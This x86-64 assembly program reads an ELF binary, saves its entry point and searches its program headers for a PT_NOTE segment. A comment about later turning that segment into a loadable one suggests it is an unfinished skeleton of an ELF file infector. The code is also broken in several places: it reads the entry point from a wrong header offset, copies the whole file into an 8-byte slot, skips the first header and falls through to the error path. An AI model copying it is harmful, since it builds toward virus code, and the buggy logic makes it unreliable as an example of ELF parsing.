section .data
    SYS_OPEN equ 2
    SYS_CLOSE equ 3
    SYS_READ equ 0
    SYS_WRITE equ 1
    SYS_EXIT equ 60
    O_RDONLY equ 0
    BuffSize equ 1024*1024         ; stack buffer size (1MB)
    no_note_msg db 'No PT_NOTE segment found', 0
    no_note_len equ $ - no_note_msg

section .bss
    buffer resb BuffSize
    elf_file resb 1024
    elf_buffer resq 1
    file_length resq 1

section .text
    global _start

_start:
    pop rdi          ; number of arguments
    pop rsi          ; ignore the program name
    pop rsi          ; get the path to the ELF file

    ; open the ELF file
    mov rax, SYS_OPEN
    mov rdx, O_RDONLY
    syscall

    cmp rax, 0
    jl _exit            ; handle errors

    ; read the ELF file
    mov rdi, rax
    mov rsi, buffer
    mov rdx, BuffSize
    mov rax, SYS_READ
    syscall

    cmp rax, 0
    jl _exit            ; handle errors

    ; load the ELF file into the stack buffer
    mov qword [file_length], rax
    mov rdi, buffer
    mov rsi, elf_buffer
    mov rdx, qword [file_length]
    mov rax, 0
    rep movsb

    ; close the ELF file descriptor
    mov rax, SYS_CLOSE
    syscall
    
     ; save the original entry point
    mov r15, buffer
    mov r14, [r15 + 168]  ; storing target original ehdr.entry from [r15 + 168] in r14
    
    parse_phdr:
    xor rcx, rcx                       ; zero out rcx
    xor rdx, rdx                       ; zero out rdx
    mov cx, word [r15 + 56]             ; rcx contains the number of entries in the PHT
    mov rbx, qword [r15 + 40]           ; rbx contains the offset of the PHT
    mov dx, word [r15 + 58]             ; rdx contains the size of an entry in the PHT



    loop_phdr:
      add rbx, rdx                   ; for every iteration, add size of a PHT entry
      mov rsi, r15
      add rsi, rbx
      dec rcx                        ; decrease phnum until we've iterated through 
                                     ; all program headers or found a PT_NOTE segment
      cmp dword [rsi], 0x4          ; if 4, we have found a PT_NOTE segment
      je pt_note_found
      cmp rcx, 0
      jg loop_phdr
      jmp no_pt_note_found           ; if no PT_NOTE segment is found




    pt_note_found:
    ; we have found a PT_NOTE segment, but we are not transforming it into a pt_load segment yet




    no_pt_note_found:
    ; handle the situation where no PT_NOTE segment is found
    ; print an error message or exit the program, for example
    mov rax, SYS_WRITE
    mov rdi, 1
    mov rsi, no_note_msg
    mov rdx, no_note_len
    syscall


    
    ; exit the program
    xor rax, rax
    ret

_exit:
    mov rax, SYS_EXIT
    xor rdi, rdi
    syscall
